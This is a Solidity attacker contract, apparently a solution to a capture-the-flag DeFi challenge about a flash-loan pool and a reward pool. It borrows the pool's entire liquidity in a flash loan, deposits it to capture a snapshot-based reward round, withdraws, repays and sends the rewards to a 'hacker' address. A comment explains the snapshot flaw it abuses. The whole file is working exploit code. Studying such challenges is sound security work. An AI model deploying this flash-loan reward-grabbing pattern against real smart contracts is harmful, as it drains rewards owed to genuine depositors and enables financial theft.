// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Ingenious {
    TheRewarderPool rewarderPool;
    address hackerAddr;

    function mwaHahaha(
        address _flashLoanerAddr,
        address _rewarderPoolAddr,
        address _hackerAddr
    ) external {
        rewarderPool = TheRewarderPool(_rewarderPoolAddr);
        hackerAddr = _hackerAddr;

        /*The Rewarder pool overlooks the fact that after every 5 days, the first 'distributeRewards()' call also takes a new snapshot first, which later causes the msg.sender's present (instantaneous) value to be returned as the snapshotted value, leaving line 76 in 'TheRewarderPool.sol' vulnerable to a token dump attack.

        In this scenario, to do the dump, we can use the Flash loan offering contract.
        */
        // 1. Take flash loan
        FlashLoanerPool(_flashLoanerAddr).flashLoan(
            IERC20(rewarderPool.liquidityToken()).balanceOf(_flashLoanerAddr)
        );
    }

    function receiveFlashLoan(uint256 _loanDvtReceived) external {
        IERC20 dvtToken = IERC20(rewarderPool.liquidityToken());
        RewardToken rewardToken = RewardToken(rewarderPool.rewardToken());

        // 2. Deposit loan tokens in RewarderPool and receive all rewards
        dvtToken.approve(address(rewarderPool), _loanDvtReceived);
        rewarderPool.deposit(_loanDvtReceived);

        // 3. Withdraw loan tokens
        rewarderPool.withdraw(_loanDvtReceived);

        // 4. Return back loan tokens
        dvtToken.transfer(msg.sender, _loanDvtReceived);

        // 5. Pass reward tokens to hacker
        rewardToken.transfer(hackerAddr, rewardToken.balanceOf(address(this)));
    }
}
